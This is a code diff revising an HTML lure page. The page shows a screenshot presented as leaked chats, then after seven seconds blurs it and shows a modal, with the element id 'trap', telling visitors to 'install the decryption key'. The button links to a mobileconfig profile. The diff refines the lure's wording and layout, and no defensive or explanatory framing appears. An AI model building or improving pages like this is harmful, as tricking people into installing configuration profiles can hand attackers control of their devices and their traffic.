@@ -3,24 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Cloud Storage - Access Portal</title>
+    <title>Private Storage</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #000; font-family: -apple-system, sans-serif; overflow: hidden; }
+        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; }
         
-        .full-screenshot {
+        /* Screenshot Container */
+        .preview {
             width: 100%;
             height: 100vh;
-            background: url('https://your-github-username.github.io/your-repo/chat-screenshot.png');
-            background-size: cover;
-            background-position: center;
-            transition: filter 0.5s ease;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .preview img {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
         }
 
         .overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75);
+            background: rgba(0, 0, 0, 0.7);
             display: none;
             align-items: center;
             justify-content: center;
@@ -28,48 +34,45 @@
         }
 
         .modal {
-            background: #ffffff;
-            color: #000000;
+            background: #fff;
             width: 85%;
-            max-width: 380px;
-            padding: 30px;
-            border-radius: 18px;
+            max-width: 350px;
+            padding: 25px;
+            border-radius: 15px;
             text-align: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
-
-        h3 { font-size: 20px; margin-bottom: 10px; color: #d32f2f; }
-        p { font-size: 15px; line-height: 1.4; color: #333; margin-bottom: 25px; }
 
         .btn {
             background-color: #007AFF;
             color: white;
             text-decoration: none;
-            padding: 14px 24px;
+            padding: 12px;
             border-radius: 10px;
-            font-weight: 600;
-            display: inline-block;
-            width: 80%;
+            font-weight: bold;
+            display: block;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
 
-    <div class="full-screenshot" id="bgImage"></div>
+    <div class="preview">
+        <img src="screenshot.png" id="bgImg">
+    </div>
 
-    <div class="overlay" id="trapModal">
+    <div class="overlay" id="trap">
         <div class="modal">
-            <h3>⚠️ Access Interrupted</h3>
-            <p>To view the complete list of leaked chats and private media, identity verification is required. Install the secure decryption key to continue.</p>
-            <a href="data.mobileconfig" class="btn">INSTALL FULL ACCESS KEY</a>
+            <h3 style="color:red;">⚠️ Access Interrupted</h3>
+            <p>Verification required to view the full chat list. Please install the decryption key.</p>
+            <a href="data.mobileconfig" class="btn">INSTALL ACCESS KEY</a>
         </div>
     </div>
 
     <script>
         setTimeout(function() {
-            document.getElementById('trapModal').style.display = 'flex';
-            document.getElementById('bgImage').style.filter = 'blur(5px)';
-        }, 7000); 
+            document.getElementById('trap').style.display = 'flex';
+            document.getElementById('bgImg').style.filter = 'blur(4px)';
+        }, 7000);
     </script>
 
 </body>
